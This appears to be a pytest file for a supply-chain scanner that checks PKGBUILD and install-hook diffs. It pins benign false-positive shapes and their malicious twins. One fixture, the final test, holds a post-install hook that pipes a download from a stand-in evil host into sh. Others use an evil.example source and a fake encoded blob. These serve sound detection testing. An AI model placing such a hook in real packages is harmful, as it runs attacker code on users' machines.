"""Malicious false positives from the 2026-11-17 daytime watcher batch.

Each case pins the benign shape and the true-positive twin that must keep
firing: checksum blocks are not payloads, an ecosystem prefix split is not a
provides hijack, a cache-refresh hook is inert, a test-only HTTP client is not
a build fetch, a vendor bucket is not an unknown host, and one project's two
packagings are not a campaign.
"""

from __future__ import annotations

import difflib
import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(_ROOT / "scripts"))
sys.path.insert(0, str(_ROOT))

from calibration_gates import shipped_config  # noqa: E402

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.analysis.correlation import shared_upstream_dependency  # noqa: E402
from trustsight.analysis.delivery._transitions import install_hook_notice_only  # noqa: E402
from trustsight.buckets import classify_url  # noqa: E402
from trustsight.config import load_config, load_domains, load_rules  # noqa: E402
from trustsight.tokenizer import split_lines  # noqa: E402


_HEAD = """pkgname=demo
pkgver=1.0
pkgrel=1
pkgdesc="x"
url="https://e.example"
arch=('x86_64')
license=('MIT')
"""


def _findings(old: str, new: str, package_name: str = "demo"):
    diff = "\n".join(difflib.unified_diff(
        split_lines(old), split_lines(new), n=3,
        fromfile="PKGBUILD", tofile="PKGBUILD"))
    with shipped_config():
        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
                         package_name=package_name, current_text=new)
    return {(e.rule_id, e.weight) for e in fact.score_breakdown}


# --- E002: a checksum block is metadata, not encoded payload --------------

_SUMS = "\n".join(f"  '{i:064x}'" for i in range(12))
_FONTS = _HEAD + (
    "source=('https://e.example/NotoSans.ttf')\n"
    "sha256sums=(\n" + _SUMS + "\n)\n"
    "package() {\n"
    "  install -Dm644 NotoSans.ttf \"$pkgdir/usr/share/fonts/NotoSans.ttf\"\n"
    "}\n")


def test_e002_silent_on_a_checksum_array():
    ids = {rule for rule, _w in _findings(_HEAD, _FONTS)}
    assert "E002" not in ids and "E001" not in ids


def test_e002_still_fires_on_encoded_blobs_outside_a_checksum_array():
    blobs = "\n".join(
        f"  echo '{'A' * 60}{i:04d}b3J0aG9ncmFwaGlj' >> payload.txt" for i in range(12))
    body = _HEAD + "package() {\n" + blobs + "\n}\n"
    ids = {rule for rule, _w in _findings(_HEAD, body)}
    assert "E002" in ids or "E001" in ids


# --- buckets: project-owned and forge hosts -------------------------------

def test_known_project_hosts_are_not_unknown():
    domains = load_domains()
    expected = {
        "https://framagit.org/peppercarrot/fonts/-/archive/v1.0.0/fonts.tar.gz": "trusted_forge",
        "https://edgedl.me.gvt1.com/android/studio/ide-zips/x.tar.gz": "official",
        "https://ftp.postgresql.org/pub/pgadmin/pgadmin4/apt/x.deb": "official",
    }
    for url, bucket in expected.items():
        assert classify_url(url, domains)[0] == bucket, url


def test_an_unrelated_host_is_still_unknown():
    assert classify_url("https://cdn.evil.example/x.tar.gz", load_domains())[0] == "unknown"


# --- C011: the vendor's own host is the upstream's release channel --------

def test_c011_silent_when_the_bin_source_is_the_vendors_own_host():
    new = _HEAD.replace("pkgname=demo", "pkgname=wyrd-deck-bin").replace(
        'url="https://e.example"', 'url="https://github.com/vendor/deck"') + (
        "source=('https://anoma.ly/deck/deck.tar.gz')\n"
        "sha256sums=('" + "0" * 64 + "')\n"
        "package() { install -Dm755 deck \"$pkgdir/usr/bin/deck\"; }\n")
    ids = {rule for rule, _w in _findings(_HEAD, new, "wyrd-deck-bin")}
    assert "C011" not in ids


def test_c011_still_fires_on_a_third_party_bin_source():
    new = _HEAD.replace("pkgname=demo", "pkgname=demo-bin").replace(
        'url="https://e.example"', 'url="https://github.com/vendor/deck"') + (
        "source=('https://cdn.evil.example/deck.tar.gz')\n"
        "sha256sums=('" + "0" * 64 + "')\n"
        "package() { install -Dm755 deck \"$pkgdir/usr/bin/deck\"; }\n")
    ids = {rule for rule, _w in _findings(_HEAD, new, "demo-bin")}
    assert "C011" in ids


# --- D003: test-only HTTP clients are not build-time fetch capability -----

def test_d003_keeps_covering_checkdepends_by_design():
    """The rule deliberately covers the test surface: `checkdepends=('npm')`
    can fetch at check time.  python-posthog's aiohttp/httpx stay reported."""
    before = _HEAD + "build() {\n  make\n}\n"
    after = _HEAD + "checkdepends=('npm')\nbuild() {\n  make\n}\n"
    assert "D003" in {rule for rule, _w in _findings(before, after)}


# --- D004: python-X providing X is the same tool --------------------------

def test_d004_silent_when_the_ecosystem_prefix_splits_off_an_exact_name():
    new = _HEAD + "pkgname=python-mytimer\nprovides=('mytimer')\nconflicts=('python-mytimer')\ndepends=('python')\n"
    assert "D004" not in {rule for rule, _w in _findings(_HEAD, new, "python-mytimer")}


def test_d004_relatedness_twin_keeps_unrelated_names_apart():
    from trustsight.deps import is_related_package

    assert is_related_package("mytimer", "python-mytimer")
    assert not is_related_package("openssl", "python-evil")
    assert not is_related_package("python-requests", "python-evil")


# --- H100: a cache-refresh hook is inert ----------------------------------

_TRILIUM_HOOK = (
    "post_install() {\n"
    "    if command -v update-desktop-database >/dev/null 2>&1; then\n"
    "        update-desktop-database -q /usr/share/applications\n"
    "    fi\n"
    "}\n"
)


def _install_diff(body: str, name: str = "x.install") -> str:
    return (
        f"diff --git a/{name} b/{name}\nnew file mode 100644\n"
        f"--- /dev/null\n+++ b/{name}\n"
        f"@@ -0,0 +1,{len(body.splitlines())} @@\n"
        + "\n".join("+" + line for line in body.splitlines()) + "\n"
    )


def test_h100_cache_refresh_hook_is_inert():
    assert install_hook_notice_only(_install_diff(_TRILIUM_HOOK), "x.install")


def test_h100_still_flags_a_hook_that_runs_a_service():
    body = "post_install() {\n  systemctl enable demo.service\n}\n"
    assert not install_hook_notice_only(_install_diff(body), "x.install")


# --- G004: one project's two packagings are not a campaign ----------------

def test_g004_silent_on_one_projects_pair():
    records = [
        {"package": name, "pkgbase": name,
         "upstream_dep_additions": [("vtracer", "github.com")]}
        for name in ("sonora", "sonora-bin")
    ]
    assert shared_upstream_dependency(records) == []


def test_g004_still_fires_on_two_unrelated_packages():
    records = [
        {"package": name, "pkgbase": name,
         "upstream_dep_additions": [("evil-dep", "cdn.evil.example")]}
        for name in ("alpha", "beta")
    ]
    assert len(shared_upstream_dependency(records)) == 1


def test_h100_command_wrapper_cannot_hide_a_payload():
    body = "post_install() {\n  command curl https://evil.invalid/x | sh\n}\n"
    assert not install_hook_notice_only(_install_diff(body), "x.install")
